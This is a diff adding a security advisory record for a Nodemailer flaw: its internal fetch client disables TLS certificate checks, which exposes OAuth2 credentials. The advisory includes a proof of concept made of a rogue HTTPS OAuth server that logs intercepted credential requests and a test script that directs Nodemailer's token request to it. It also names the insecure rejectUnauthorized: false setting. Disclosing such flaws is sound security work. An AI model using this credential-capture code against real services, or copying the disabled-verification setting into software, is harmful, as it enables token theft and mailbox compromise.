@@ -1,0 +1,538 @@
+advisory_id: GHSA-r7g4-qg5f-qqm2
+datasource_id: github_osv/GHSA-r7g4-qg5f-qqm2
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-r7g4-qg5f-qqm2/GHSA-r7g4-qg5f-qqm2.json
+aliases: []
+summary: |
+  Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception
+  ### Summary
+  Nodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.
+
+  As a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.
+
+  An attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:
+
+  - OAuth client_secret
+  - refresh_token
+  - access tokens
+
+  The issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.
+
+  ### Details
+  Root Cause
+
+  The issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.
+
+  Inside:
+
+  `lib/fetch/index.js`
+
+  the request options contain:
+
+  `rejectUnauthorized: false`
+
+  This disables TLS peer certificate verification globally for the internal HTTPS client unless explicitly overridden through optional TLS configuration.
+
+  As a result:
+
+  - self-signed certificates are trusted
+  - invalid CA chains are accepted
+  - hostname validation is bypassed
+  - attacker-controlled HTTPS endpoints are treated as trusted
+
+  This violates expected HTTPS security guarantees.
+
+  **Vulnerable Flow**
+
+  The vulnerable execution chain is:
+
+  OAuth2 Transport
+          ↓
+  XOAuth2 token generation
+          ↓
+  Internal HTTPS fetch client
+          ↓
+  HTTPS request with rejectUnauthorized:false
+          ↓
+  Attacker-controlled/self-signed endpoint trusted
+          ↓
+  OAuth credentials **transmitted**
+
+
+  ### PoC
+  **Environment**
+  #### Mail API (app/server.js)
+  ```
+  const express = require("express");
+  const nodemailer = require("nodemailer");
+  require("dotenv").config();
+
+  const app = express();
+
+  app.use(express.json());
+
+  const transporter = nodemailer.createTransport({
+      host: process.env.SMTP_HOST,
+      port: process.env.SMTP_PORT,
+      secure: false,
+      auth: {
+          user: process.env.SMTP_USER,
+          pass: process.env.SMTP_PASS
+      }
+  });
+
+  app.post("/send", async (req, res) => {
+      try {
+          const { to, subject, text, html } = req.body;
+
+          const info = await transporter.sendMail({
+              from: `"Mailer" <${process.env.SMTP_USER}>`,
+              to,
+              subject,
+              text,
+              html
+          });
+
+          res.json({
+              success: true,
+              messageId: info.messageId
+          });
+
+      } catch (err) {
+          console.error(err);
+          res.status(500).json({
+              success: false,
+              error: err.message
+          });
+      }
+  });
+
+  app.listen(process.env.PORT, () => {
+      console.log(`Mailer running on port ${process.env.PORT}`);
+  });
+  ```
+
+  #### Malicious HTTPS OAuth Server (poc/evil-oauth.js)
+
+  ```
+  const https = require('https');
+  const fs = require('fs');
+
+  https.createServer({
+      key: fs.readFileSync('./key.pem'),
+      cert: fs.readFileSync('./cert.pem')
+  }, (req, res) => {
+
+      console.log('\n==== REQUEST INTERCEPTED ====');
+      console.log(req.method, req.url);
+
+      let body = '';
+
+      req.on('data', chunk => {
+          body += chunk;
+      });
+
+      req.on('end', () => {
+
+          console.log('\nPOST BODY:');
+          console.log(body);
+
+          res.writeHead(200, {
+              'Content-Type': 'application/json'
+          });
+
+          res.end(JSON.stringify({
+              access_token: 'attacker_token',
+              expires_in: 3600
+          }));
+      });
+
+  }).listen(8443, () => {
+      console.log('Malicious HTTPS OAuth server listening on 8443');
+  });
+  ```
+
+  #### Nodemailer OAuth2 Test (test.js)
+
+  ```
+  const nodemailer = require('./');
+
+  const transporter = nodemailer.createTransport({
+      service: 'gmail',
+
+      auth: {
+          type: 'OAuth2',
+
+          user: 'redacted@example.com',
+
+          clientId: 'CLIENT_ID_REDACTED',
+          clientSecret: 'CLIENT_SECRET_REDACTED',
+
+          refreshToken: 'REFRESH_TOKEN_REDACTED',
+
+          accessUrl: 'https://localhost:8443/token'
+      }
+  });
+
+  transporter.sendMail({
+      from: 'redacted@example.com',
+      to: 'redacted@example.com',
+      subject: 'PoC',
+      text: 'test'
+
+  }, (err, info) => {
+
+      console.log('\n==== NODEMAILER RESULT ====');
+
+      if (err) {
+          console.error(err);
+      } else {
+          console.log(info);
+      }
+  });
+  ```
+  **Steps to Reproduce**
+
+  - Start malicious HTTPS OAuth server:
+  - node poc/evil-oauth.js
+  - Run Nodemailer OAuth2 test:
+  - node test.js
+  - Observe intercepted OAuth2 request body on the malicious HTTPS server.
+
+  **PIC**
+  <img width="1919" height="1029" alt="image" src="https://github.com/user-attachments/assets/fdeafeb4-c0c5-49f8-beeb-e7f945be0516" />
+
+  ### Impact
+
+  - OAuth credential theft
+  - unauthorized email access
+  - persistent token abuse
+  - unauthorized mail sending
+  - mailbox compromise
+  - interception/tampering of OAuth responses
+
+  The issue effectively downgrades HTTPS security protections for sensitive OAuth credential exchanges.
+impacted_packages:
+  - purl: pkg:npm/nodemailer
+    affected_versions: vers:npm/<=8.0.7
+    fixed_versions: vers:npm/8.0.8
+    affected_packages:
+      - pkg:npm/nodemailer@0.1.1
+      - pkg:npm/nodemailer@0.1.2
+      - pkg:npm/nodemailer@0.1.3
+      - pkg:npm/nodemailer@0.1.4
+      - pkg:npm/nodemailer@0.1.5
+      - pkg:npm/nodemailer@0.1.6
+      - pkg:npm/nodemailer@0.1.7
+      - pkg:npm/nodemailer@0.1.8
+      - pkg:npm/nodemailer@0.1.9
+      - pkg:npm/nodemailer@0.1.10
+      - pkg:npm/nodemailer@0.1.11
+      - pkg:npm/nodemailer@0.1.12
+      - pkg:npm/nodemailer@0.1.13
+      - pkg:npm/nodemailer@0.1.14
+      - pkg:npm/nodemailer@0.1.15
+      - pkg:npm/nodemailer@0.1.16
+      - pkg:npm/nodemailer@0.1.17
+      - pkg:npm/nodemailer@0.1.18
+      - pkg:npm/nodemailer@0.1.19
+      - pkg:npm/nodemailer@0.1.20
+      - pkg:npm/nodemailer@0.1.21
+      - pkg:npm/nodemailer@0.1.22
+      - pkg:npm/nodemailer@0.1.23
+      - pkg:npm/nodemailer@0.1.24
+      - pkg:npm/nodemailer@0.2.0
+      - pkg:npm/nodemailer@0.2.1
+      - pkg:npm/nodemailer@0.2.2
+      - pkg:npm/nodemailer@0.2.3
+      - pkg:npm/nodemailer@0.2.4
+      - pkg:npm/nodemailer@0.3.0
+      - pkg:npm/nodemailer@0.3.1
+      - pkg:npm/nodemailer@0.3.2
+      - pkg:npm/nodemailer@0.3.3
+      - pkg:npm/nodemailer@0.3.4
+      - pkg:npm/nodemailer@0.3.5
+      - pkg:npm/nodemailer@0.3.6
+      - pkg:npm/nodemailer@0.3.7
+      - pkg:npm/nodemailer@0.3.8
+      - pkg:npm/nodemailer@0.3.9
+      - pkg:npm/nodemailer@0.3.10
+      - pkg:npm/nodemailer@0.3.11
+      - pkg:npm/nodemailer@0.3.12
+      - pkg:npm/nodemailer@0.3.13
+      - pkg:npm/nodemailer@0.3.14
+      - pkg:npm/nodemailer@0.3.15
+      - pkg:npm/nodemailer@0.3.16
+      - pkg:npm/nodemailer@0.3.17
+      - pkg:npm/nodemailer@0.3.18
+      - pkg:npm/nodemailer@0.3.19
+      - pkg:npm/nodemailer@0.3.20
+      - pkg:npm/nodemailer@0.3.21
+      - pkg:npm/nodemailer@0.3.22
+      - pkg:npm/nodemailer@0.3.23
+      - pkg:npm/nodemailer@0.3.24
+      - pkg:npm/nodemailer@0.3.25
+      - pkg:npm/nodemailer@0.3.26
+      - pkg:npm/nodemailer@0.3.27
+      - pkg:npm/nodemailer@0.3.28
+      - pkg:npm/nodemailer@0.3.29
+      - pkg:npm/nodemailer@0.3.30
+      - pkg:npm/nodemailer@0.3.31
+      - pkg:npm/nodemailer@0.3.32
+      - pkg:npm/nodemailer@0.3.33
+      - pkg:npm/nodemailer@0.3.34
+      - pkg:npm/nodemailer@0.3.35
+      - pkg:npm/nodemailer@0.3.37
+      - pkg:npm/nodemailer@0.3.38
+      - pkg:npm/nodemailer@0.3.39
+      - pkg:npm/nodemailer@0.3.40
+      - pkg:npm/nodemailer@0.3.41
+      - pkg:npm/nodemailer@0.3.42
+      - pkg:npm/nodemailer@0.3.43
+      - pkg:npm/nodemailer@0.3.44
+      - pkg:npm/nodemailer@0.4.0
+      - pkg:npm/nodemailer@0.4.1
+      - pkg:npm/nodemailer@0.4.2
+      - pkg:npm/nodemailer@0.4.3
+      - pkg:npm/nodemailer@0.4.4
+      - pkg:npm/nodemailer@0.5.0
+      - pkg:npm/nodemailer@0.5.1
+      - pkg:npm/nodemailer@0.5.2
+      - pkg:npm/nodemailer@0.5.3
+      - pkg:npm/nodemailer@0.5.4
+      - pkg:npm/nodemailer@0.5.5
+      - pkg:npm/nodemailer@0.5.6
+      - pkg:npm/nodemailer@0.5.7
+      - pkg:npm/nodemailer@0.5.8
+      - pkg:npm/nodemailer@0.5.9
+      - pkg:npm/nodemailer@0.5.10
+      - pkg:npm/nodemailer@0.5.11
+      - pkg:npm/nodemailer@0.5.12
+      - pkg:npm/nodemailer@0.5.13
+      - pkg:npm/nodemailer@0.5.14
+      - pkg:npm/nodemailer@0.5.15
+      - pkg:npm/nodemailer@0.6.0
+      - pkg:npm/nodemailer@0.6.1
+      - pkg:npm/nodemailer@0.6.2
+      - pkg:npm/nodemailer@0.6.3
+      - pkg:npm/nodemailer@0.6.4
+      - pkg:npm/nodemailer@0.6.5
+      - pkg:npm/nodemailer@0.7.0
+      - pkg:npm/nodemailer@0.7.1
+      - pkg:npm/nodemailer@1.0.0-rc.1
+      - pkg:npm/nodemailer@1.0.0
+      - pkg:npm/nodemailer@1.0.1
+      - pkg:npm/nodemailer@1.0.2
+      - pkg:npm/nodemailer@1.0.3
+      - pkg:npm/nodemailer@1.0.4
+      - pkg:npm/nodemailer@1.1.0
+      - pkg:npm/nodemailer@1.1.1
+      - pkg:npm/nodemailer@1.1.2
+      - pkg:npm/nodemailer@1.2.0
+      - pkg:npm/nodemailer@1.2.1
+      - pkg:npm/nodemailer@1.2.2
+      - pkg:npm/nodemailer@1.3.0
+      - pkg:npm/nodemailer@1.3.1
+      - pkg:npm/nodemailer@1.3.2
+      - pkg:npm/nodemailer@1.3.3
+      - pkg:npm/nodemailer@1.3.4
+      - pkg:npm/nodemailer@1.4.0
+      - pkg:npm/nodemailer@1.5.0
+      - pkg:npm/nodemailer@1.6.0
+      - pkg:npm/nodemailer@1.7.0
+      - pkg:npm/nodemailer@1.8.0
+      - pkg:npm/nodemailer@1.9.0
+      - pkg:npm/nodemailer@1.10.0
+      - pkg:npm/nodemailer@1.11.0
+      - pkg:npm/nodemailer@2.0.0-beta.0
+      - pkg:npm/nodemailer@2.0.0-beta.1
+      - pkg:npm/nodemailer@2.0.0-beta.2
+      - pkg:npm/nodemailer@2.0.0-rc.1
+      - pkg:npm/nodemailer@2.0.0-rc.2
+      - pkg:npm/nodemailer@2.0.0
+      - pkg:npm/nodemailer@2.1.0-beta.0
+      - pkg:npm/nodemailer@2.1.0-beta.1
+      - pkg:npm/nodemailer@2.1.0-beta.2
+      - pkg:npm/nodemailer@2.1.0-beta.3
+      - pkg:npm/nodemailer@2.1.0-rc.0
+      - pkg:npm/nodemailer@2.1.0-rc.1
+      - pkg:npm/nodemailer@2.1.0
+      - pkg:npm/nodemailer@2.2.0-beta.0
+      - pkg:npm/nodemailer@2.2.0-beta.1
+      - pkg:npm/nodemailer@2.2.0-beta.2
+      - pkg:npm/nodemailer@2.2.0-beta.3
+      - pkg:npm/nodemailer@2.2.0-beta.4
+      - pkg:npm/nodemailer@2.2.0-beta.5
+      - pkg:npm/nodemailer@2.2.0-beta.6
+      - pkg:npm/nodemailer@2.2.0-rc.7
+      - pkg:npm/nodemailer@2.2.0-rc.8
+      - pkg:npm/nodemailer@2.2.0-rc.9
+      - pkg:npm/nodemailer@2.2.0-rc.10
+      - pkg:npm/nodemailer@2.2.0-rc.11
+      - pkg:npm/nodemailer@2.2.0
+      - pkg:npm/nodemailer@2.2.1
+      - pkg:npm/nodemailer@2.3.0-beta.0
+      - pkg:npm/nodemailer@2.3.0-beta.1
+      - pkg:npm/nodemailer@2.3.0-rc.2
+      - pkg:npm/nodemailer@2.3.0-rc.3
+      - pkg:npm/nodemailer@2.3.0
+      - pkg:npm/nodemailer@2.3.1-rc.0
+      - pkg:npm/nodemailer@2.3.1
+      - pkg:npm/nodemailer@2.3.2
+      - pkg:npm/nodemailer@2.4.0-beta.0
+      - pkg:npm/nodemailer@2.4.0
+      - pkg:npm/nodemailer@2.4.1
+      - pkg:npm/nodemailer@2.4.2
+      - pkg:npm/nodemailer@2.5.0
+      - pkg:npm/nodemailer@2.6.0
+      - pkg:npm/nodemailer@2.6.1
+      - pkg:npm/nodemailer@2.6.2
+      - pkg:npm/nodemailer@2.6.3
+      - pkg:npm/nodemailer@2.6.4
+      - pkg:npm/nodemailer@2.7.0
+      - pkg:npm/nodemailer@2.7.1
+      - pkg:npm/nodemailer@2.7.2
+      - pkg:npm/nodemailer@3.0.0
+      - pkg:npm/nodemailer@3.0.1
+      - pkg:npm/nodemailer@3.0.2
+      - pkg:npm/nodemailer@3.1.0
+      - pkg:npm/nodemailer@3.1.1
+      - pkg:npm/nodemailer@3.1.2
+      - pkg:npm/nodemailer@3.1.3
+      - pkg:npm/nodemailer@3.1.4
+      - pkg:npm/nodemailer@3.1.5
+      - pkg:npm/nodemailer@3.1.6
+      - pkg:npm/nodemailer@3.1.7
+      - pkg:npm/nodemailer@3.1.8
+      - pkg:npm/nodemailer@4.0.0
+      - pkg:npm/nodemailer@4.0.1
+      - pkg:npm/nodemailer@4.1.0
+      - pkg:npm/nodemailer@4.1.1
+      - pkg:npm/nodemailer@4.1.2
+      - pkg:npm/nodemailer@4.1.3
+      - pkg:npm/nodemailer@4.2.0
+      - pkg:npm/nodemailer@4.3.0
+      - pkg:npm/nodemailer@4.3.1
+      - pkg:npm/nodemailer@4.4.0
+      - pkg:npm/nodemailer@4.4.1
+      - pkg:npm/nodemailer@4.4.2
+      - pkg:npm/nodemailer@4.5.0
+      - pkg:npm/nodemailer@4.6.0
+      - pkg:npm/nodemailer@4.6.1
+      - pkg:npm/nodemailer@4.6.2
+      - pkg:npm/nodemailer@4.6.3
+      - pkg:npm/nodemailer@4.6.4
+      - pkg:npm/nodemailer@4.6.5
+      - pkg:npm/nodemailer@4.6.6
+      - pkg:npm/nodemailer@4.6.7
+      - pkg:npm/nodemailer@4.6.8
+      - pkg:npm/nodemailer@4.7.0
+      - pkg:npm/nodemailer@5.0.0
+      - pkg:npm/nodemailer@5.0.1
+      - pkg:npm/nodemailer@5.1.0
+      - pkg:npm/nodemailer@5.1.1
+      - pkg:npm/nodemailer@6.0.0
+      - pkg:npm/nodemailer@6.1.0
+      - pkg:npm/nodemailer@6.1.1
+      - pkg:npm/nodemailer@6.2.1
+      - pkg:npm/nodemailer@6.3.0
+      - pkg:npm/nodemailer@6.3.1
+      - pkg:npm/nodemailer@6.4.0
+      - pkg:npm/nodemailer@6.4.1
+      - pkg:npm/nodemailer@6.4.2
+      - pkg:npm/nodemailer@6.4.3
+      - pkg:npm/nodemailer@6.4.4
+      - pkg:npm/nodemailer@6.4.5
+      - pkg:npm/nodemailer@6.4.6
+      - pkg:npm/nodemailer@6.4.7
+      - pkg:npm/nodemailer@6.4.8
+      - pkg:npm/nodemailer@6.4.10
+      - pkg:npm/nodemailer@6.4.11
+      - pkg:npm/nodemailer@6.4.12
+      - pkg:npm/nodemailer@6.4.13
+      - pkg:npm/nodemailer@6.4.14
+      - pkg:npm/nodemailer@6.4.15
+      - pkg:npm/nodemailer@6.4.16
+      - pkg:npm/nodemailer@6.4.17
+      - pkg:npm/nodemailer@6.4.18
+      - pkg:npm/nodemailer@6.5.0
+      - pkg:npm/nodemailer@6.6.0
+      - pkg:npm/nodemailer@6.6.1
+      - pkg:npm/nodemailer@6.6.2
+      - pkg:npm/nodemailer@6.6.3
+      - pkg:npm/nodemailer@6.6.4
+      - pkg:npm/nodemailer@6.6.5
+      - pkg:npm/nodemailer@6.7.0
+      - pkg:npm/nodemailer@6.7.1
+      - pkg:npm/nodemailer@6.7.2
+      - pkg:npm/nodemailer@6.7.3
+      - pkg:npm/nodemailer@6.7.4
+      - pkg:npm/nodemailer@6.7.5
+      - pkg:npm/nodemailer@6.7.6
+      - pkg:npm/nodemailer@6.7.7
+      - pkg:npm/nodemailer@6.7.8
+      - pkg:npm/nodemailer@6.8.0
+      - pkg:npm/nodemailer@6.9.0
+      - pkg:npm/nodemailer@6.9.1
+      - pkg:npm/nodemailer@6.9.2
+      - pkg:npm/nodemailer@6.9.3
+      - pkg:npm/nodemailer@6.9.4
+      - pkg:npm/nodemailer@6.9.5
+      - pkg:npm/nodemailer@6.9.6
+      - pkg:npm/nodemailer@6.9.7
+      - pkg:npm/nodemailer@6.9.8
+      - pkg:npm/nodemailer@6.9.9
+      - pkg:npm/nodemailer@6.9.10
+      - pkg:npm/nodemailer@6.9.11
+      - pkg:npm/nodemailer@6.9.12
+      - pkg:npm/nodemailer@6.9.13
+      - pkg:npm/nodemailer@6.9.14
+      - pkg:npm/nodemailer@6.9.15
+      - pkg:npm/nodemailer@6.9.16
+      - pkg:npm/nodemailer@6.10.0
+      - pkg:npm/nodemailer@6.10.1
+      - pkg:npm/nodemailer@7.0.0
+      - pkg:npm/nodemailer@7.0.1
+      - pkg:npm/nodemailer@7.0.2
+      - pkg:npm/nodemailer@7.0.3
+      - pkg:npm/nodemailer@7.0.4
+      - pkg:npm/nodemailer@7.0.5
+      - pkg:npm/nodemailer@7.0.6
+      - pkg:npm/nodemailer@7.0.7
+      - pkg:npm/nodemailer@7.0.9
+      - pkg:npm/nodemailer@7.0.10
+      - pkg:npm/nodemailer@7.0.11
+      - pkg:npm/nodemailer@7.0.12
+      - pkg:npm/nodemailer@7.0.13
+      - pkg:npm/nodemailer@8.0.0
+      - pkg:npm/nodemailer@8.0.1
+      - pkg:npm/nodemailer@8.0.2
+      - pkg:npm/nodemailer@8.0.3
+      - pkg:npm/nodemailer@8.0.4
+      - pkg:npm/nodemailer@8.0.5
+      - pkg:npm/nodemailer@8.0.6
+      - pkg:npm/nodemailer@8.0.7
+    fixed_packages:
+      - pkg:npm/nodemailer@8.0.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-r7g4-qg5f-qqm2/GHSA-r7g4-qg5f-qqm2.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-295
+references:
+  - url: https://github.com/nodemailer/nodemailer
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2
+    reference_type:
+    reference_id:
+exploits: []
